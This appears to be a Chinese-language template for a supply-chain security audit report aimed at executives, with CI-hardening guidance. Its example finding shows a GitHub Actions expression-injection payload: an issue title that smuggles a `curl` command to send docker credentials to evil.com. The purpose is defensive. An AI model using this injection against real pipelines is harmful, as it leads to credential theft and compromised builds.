---
description: 供应链报告生成 - 面向工程总监的防线大重置
tags: [supply-chain, report-generator, architecture, mitigation, zero-trust]
---

# 供应链报告生成 (Report Generator): 颁发明示流水线沦陷的系统改革通牒

> 这绝不是一份让程序员去加个过滤补丁的报告。
> 这是一份要求整个 DevOps 研发高管重新规划流水线的强制命令。
> 你的读者不是安全工程师，是 CTO、VP of Engineering、技术总监。
> 他们关心的是：这个漏洞会不会让公司上新闻？修复需要停服多久？要花多少钱？

## 报告结构设计：金字塔原则

### 第一层：一句话裁决（Executive Summary）

用 3 句话让高管理解严重性：

```
贵司的软件构建流水线存在 [N] 个 Critical 级别的供应链安全漏洞。
攻击者可通过 [最危险的入口，如：提交一个看似正常的 PR] 获取 [最敏感的凭证，如：AWS 生产环境密钥]，
进而 [最坏后果，如：控制全部生产服务器并篡改客户数据]。
这不是"可能出问题"，是"今天就可以被利用"。
```

### 第二层：威胁全景图（Threat Landscape）

用可视化方式展示攻击面：

```
[外部攻击者]
    │ 提交恶意 PR / 发布恶意包 / 创建 Issue
    ▼
[GitHub Actions Runner] ──► 命令注入 / 表达式注入
    │
    ├──► GITHUB_TOKEN ──► 篡改源代码 / 发布恶意 release
    ├──► AWS_KEY ──► 控制云平台 / 数据泄露
    ├──► DOCKER_TOKEN ──► 污染镜像仓库
    └──► KUBECONFIG ──► 控制 K8s 集群
    │
    ▼
[开发者机器] ──► npm install ──► 恶意 postinstall 执行
    │
    ▼
[最终用户] ──► 下载被篡改的产物 ──► 本地 RCE / 数据泄露
```

### 第三层：漏洞详情（Findings）

每个 finding 必须包含：

```
## Finding SC-001: CI 表达式注入导致 Secrets 泄露

- 严重等级: Critical (P0)
- 位置: .github/workflows/test.yml:23
- 第一性原理: CI/CD Pipeline Poisoning

### 问题描述
Workflow 将用户可控的 Issue 标题直接拼接到 shell 命令中：
```yaml
run: npm test --grep="${{ github.event.issue.title }}"
```

### 攻击路径
1. 攻击者创建 Issue，标题设为 `foo"; curl -d @/home/runner/.docker/config.json https://evil.com; echo "bar`
2. GitHub Actions 渲染后执行：`npm test --grep="foo"; curl -d @/home/runner/.docker/config.json https://evil.com; echo "bar"`
3. Runner 的 docker config（包含 registry 凭证）被发送到攻击者服务器

### 业务影响
- 直接影响: CI Runner 的 Docker Hub 凭证泄露
- 间接影响: 攻击者可推送恶意镜像到公司的 Docker Hub 仓库
- 最坏情况: 所有基于该镜像的服务被感染

### 修复方案
- 短期: 将用户输入通过环境变量传递，不直接拼接
  ```yaml
  env:
    TEST_PATTERN: ${{ github.event.issue.title }}
  run: npm test --grep="$TEST_PATTERN"
  ```
- 长期: 使用 GitHub Actions 的 `actions/github-script` 进行输入验证和转义

### OSV 协同
- 相关 CVE: CVE-2023-XXXX（GitHub Actions 表达式注入）
- 该 CVE 已公开利用，降低了攻击门槛
```

---

## 根治级防御铁律

不是建议，是强制要求。每条必须给出"不这样做的后果"。

### 铁律一：强制严格隔离拉取策略 (Strict Scoped Resolution)

**要求**：
- 所有内部私有包必须使用 scope（如 `@companyname/auth`）
- 每个 scope 必须在包管理器配置中绑定到唯一的私有 registry
- 禁止在公共源和私有源之间使用模糊的多源配置

**不这样做的后果**：
> 攻击者在公网注册同名包，赋予极高版本号。包管理器自动选择公网版本，
> 全公司所有开发者和 CI 构建都会安装恶意包。一次投毒 = 全公司 RCE。

**实施路径**：
```json
// .npmrc
@companyname:registry=https://internal.npm.company.com
registry=https://registry.npmjs.org
```

```ini
# pip.conf —— 使用 index-url + trusted-host，不用 extra-index-url
[global]
index-url = https://internal.pypi.company.com/simple
trusted-host = internal.pypi.company.com
```

### 铁律二：执行上下文彻底清剿 (Safe Interpolation in CI)

**要求**：
- 严禁在 CI YAML 的 `run:` 命令中直接拼接 `${{ }}` 表达式
- 所有用户可控输入必须通过 `env:` 环境变量传递
- 环境变量在脚本中通过 `$ENV_VAR` 读取，由 shell 负责解析

**不这样做的后果**：
> 任何可以创建 Issue/PR/Comment 的外部人员，都可以在公司的构建服务器上执行任意命令。
> 这包括窃取 AWS Key、篡改源代码、部署后门。构建服务器 = 公司命脉 = 完全开放给互联网。

**实施路径**：
```yaml
# ❌ 禁止
run: npm test --grep="${{ github.event.issue.title }}"

# ✅ 正确
env:
  TEST_PATTERN: ${{ github.event.issue.title }}
run: npm test --grep="$TEST_PATTERN"
```

### 铁律三：权限剥夺与生命衰变控制 (Principle of Least Privilege Runner)

**要求**：
- `pull_request` 触发的工作流不得访问 secrets（使用 `pull_request` 而非 `pull_request_target`）
- GITHUB_TOKEN 必须显式配置最小权限（`permissions: contents: read`）
- 测试步骤不得访问部署凭证；部署步骤必须在独立环境中运行
- 开启 Egress 网络监控，拦截非白名单出站连接

**不这样做的后果**：
> 外部贡献者提交一个 PR，CI 自动运行测试。测试步骤持有 AWS Key。
> 攻击者在测试代码中加入 `console.log(process.env)`，AWS Key 出现在公开日志中。
> 或者更隐蔽：通过命令注入直接外发 secrets。公司云基础设施完全暴露。

**实施路径**：
```yaml
# 显式配置最小权限
permissions:
  contents: read
  pull-requests: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
      # 测试步骤不注入任何 secrets

  deploy:
    needs: test
    runs-on: ubuntu-latest
    environment: production  # 使用 GitHub Environment 保护规则
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
        env:
          AWS_KEY: ${{ secrets.AWS_KEY }}  # 只在部署步骤注入
```

### 铁律四：Lockfile 不可变与审计 (Immutable Lockfile)

**要求**：
- CI 必须使用 `npm ci`（而非 `npm install`），确保 lockfile 严格匹配
- 所有 lockfile 变更必须经过双人审查
- 使用自动化工具（如 `lockfile-lint`）检查 resolved URL 域名白名单

**不这样做的后果**：
> 攻击者在 lockfile 中修改一个深层依赖的下载 URL。这个修改隐藏在 2000 行 diff 中。
> 审查者没有发现。lockfile 被合并。从此每次构建都从攻击者服务器下载依赖。
> 公司持续分发恶意软件，可能数月甚至数年才被发现。

**实施路径**：
```bash
# CI 中强制使用 npm ci
- name: Install dependencies
  run: npm ci  # 如果 lockfile 和 package.json 不一致，直接失败

# lockfile-lint 检查
- name: Audit lockfile
  run: npx lockfile-lint --path package-lock.json --allowed-hosts npm github.com
```

### 铁律五：缓存签名与隔离 (Signed & Isolated Cache)

**要求**：
- 所有 CI 缓存必须经过签名或 hash 校验
- 不同信任级别的 workflow 不得共享缓存（如 PR workflow 和 deploy workflow 隔离）
- 定期清理缓存，限制缓存保留时间

**不这样做的后果**：
> 攻击者污染共享缓存。后续的正常构建恢复该缓存，将后门编译进产物。
> 由于缓存是"正常的 CI 产物"，常规审计不会发现异常。
> 公司持续发布带后门的软件，攻击者无需再次入侵即可长期控制。

---

## 报告附录：OSV 协同分析

```
## 已知漏洞与发现的重叠分析

| CVE-ID | 受影响的包 | 项目中的使用 | 与本次发现的关联 | 风险增强 |
|--------|-----------|-------------|----------------|---------|
| CVE-2023-XXXX | actions/checkout@v2 | .github/workflows/test.yml | CI 工具链漏洞 + 表达式注入 = 双重利用 | +1 severity |
| CVE-2022-YYYY | lodash@4.17.20 | package.json | 已知漏洞包被生命周期脚本利用 | Medium |
| GHSA-ZZZZ | npm@8.x | CI 环境 | npm 安装时脚本执行漏洞 | +1 severity |

## 建议
- 立即升级所有 OSV 报告中的 Critical/High 漏洞
- 将 OSV 扫描集成到 CI 流程，阻断有已知漏洞的依赖进入主分支
- 对 OSV 报告的每个 CVE，检查是否存在对应的 supply-chain 攻击面（如：有 CVE 的依赖是否在 CI 中执行生命周期脚本）
```

---

## 报告最终输出模板

```markdown
# 供应链安全审计报告

**项目**: [项目名称]
**审计日期**: [日期]
**审计工具**: huntzero Supply Chain Analyzer + OSV-Scanner
**报告版本**: v1.0

---

## 执行摘要（给 CTO/VP 看）

[3 句话裁决]

## 威胁全景图

[ASCII 攻击链图]

## 漏洞发现清单

| ID | 原理 | 位置 | 等级 | 修复优先级 |
|----|------|------|------|-----------|
| SC-001 | CI Poisoning | .github/workflows/test.yml | Critical | P0 |
| SC-002 | Dependency Confusion | package.json | High | P1 |

## 详细发现

[每个 finding 的完整描述]

## 根治级防御铁律

[5 条铁律，每条包含：要求 + 后果 + 实施路径]

## 修复时间线建议

| 时间 | 行动 | 负责人 |
|------|------|--------|
| 立即 | Rotate 所有可能泄露的 secrets | Security Team |
| 24h 内 | 禁用/修复 Critical 漏洞 workflow | DevOps |
| 1周内 | 实施铁律一、二、三 | Platform Team |
| 1月内 | 实施铁律四、五 + 全面审计所有项目 | Security + DevOps |
| 持续 | OSV 扫描集成到 CI + 定期供应链审计 | Security |

## 附录：OSV 协同分析

[OSV 报告与发现的关联分析]
```
